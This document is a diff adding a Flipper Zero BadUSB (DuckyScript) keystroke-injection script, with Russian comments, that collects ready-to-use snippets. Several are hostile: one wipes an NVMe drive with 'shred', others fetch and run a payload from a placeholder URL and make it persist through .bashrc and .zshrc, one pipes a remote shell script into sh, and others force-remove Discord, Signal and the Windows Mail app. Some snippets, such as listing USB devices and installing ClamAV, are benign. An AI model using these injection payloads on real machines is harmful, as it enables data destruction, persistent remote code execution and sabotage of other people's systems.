@@ -1,0 +1,77 @@
+REM Ожидание нажатия кнопки на флиппере
+WAIT_FOR_BUTTON_PRESS
+
+REM Свернуть все окна
+WINDOWS d
+
+REM Открыть терминал Linux
+CTRL-ALT T
+
+REM Открыть файл или url. Windows
+GUI r
+STRING powershell
+ENTER
+STRING start YOUR LINK WITH THE HTTPS://
+
+REM Затирание раздела нулями
+CTRL-ALT T
+STRING sudo shred -vn1 /dev/nvme0n1
+
+REM Открыть терминал, скачать appimage, запустить. прописать в .bashrc для автостарта
+STRING nohup wget https://бла-бла-бла/Payload.AppImage && chmod +x Payload.AppImage && ./Payload.AppImage & disown && exit
+ENTER
+STRING echo "wget https://бла-бла-бла/Payload.AppImage && chmod +x Payload.AppImage && ./Payload.AppImage & disown" >> ~/.zshrc && echo "wget https://бла-бла-бла/Payload.AppImage && chmod +x Payload.AppImage && ./Payload.AppImage & disown" >> ~/.bashrc && exit
+ENTER
+
+REM Открыть терминал, скачать .sh скрипт, запустить.
+CTRL-ALT t
+DELAY 1500
+STRING nohup wget -O - https://бла-бла-бла/Payload.sh | sh 2>/dev/null & disown
+ENTER
+
+REM Получить список подключенных USB
+GUI r
+DELAY 2000
+STRING powershell
+DELAY 250
+ENTER
+DELAY 2000
+STRING Get-PnpDevice -PresentOnly | Where-Object { $_.InstanceId -match '^USB' } | Out-File -FilePath .\USB-Connected.txt
+ENTER
+
+REM установка ClamAV
+GUI r
+DELAY 1000
+STRING powershell.exe
+ENTER
+DELAY 1000
+STRING Start-Process powershell -Verb runAs ; exit
+ENTER
+DELAY 4000
+LEFT
+ENTER
+DELAY 4000
+STRING mkdir $env:USERPROFILE\AppData\Local\Temp ; cd $env:USERPROFILE\AppData\Local\Temp ; Invoke-WebRequest -Uri https://www.clamav.net/downloads/production/clamav-0.105.0.win.x64.zip -OutFile clam.zip ; Expand-Archive -Force clam.zip ; del clam.zip ; cd clam\* ; mv .\conf_examples\freshclam.conf.sample freshclam.conf ; mv .\conf_examples\clamd.conf.sample clamd.conf ; Set-Content -Path "freshclam.conf" -Value (get-content -Path "freshclam.conf" | Select-String -Pattern 'Example' -NotMatch) ; Set-Content -Path "clamd.conf" -Value (get-content -Path "clamd.conf" | Select-String -Pattern 'Example' -NotMatch) ; Start-Process -Wait .\freshclam.exe ; Start-Process -NoNewWindow -Wait .\clamscan.exe "--memory --kill" ; cd $env:USERPROFILE\AppData\Local\Temp ; rmdir -R clam
+ENTER
+
+REM Установка цвета в cmd
+STRING color 02 && ECHO OFF && cls
+
+REM Удалить discord
+STRING if (Test-Path "C:\Program Files (x86)\Discord") { Remove-Item -Recurse -Force "C:\Program Files (x86)\Discord"; Write-Output "Deleted Discord from $discordPath" } else { Write-Output "Discord is not installed on this computer." }; exit
+DELAY 200
+ENTER
+
+REM Удалить Windows Mail app
+STRING AppxPackage Microsoft.windowscommunicationsapps | Remove-AppxPackage
+DELAY 200
+ENTER
+
+REM Удалить Signal
+STRINGLN Stop-Process -Name "Signal"
+DELAY 500
+STRINGLN  Start-Process "$env:LocalAppData\Programs\signal-desktop\Uninstall Signal.exe"
+DELAY 1000
+REM Popup "Are you sure?"
+ENTER
+ALT F4
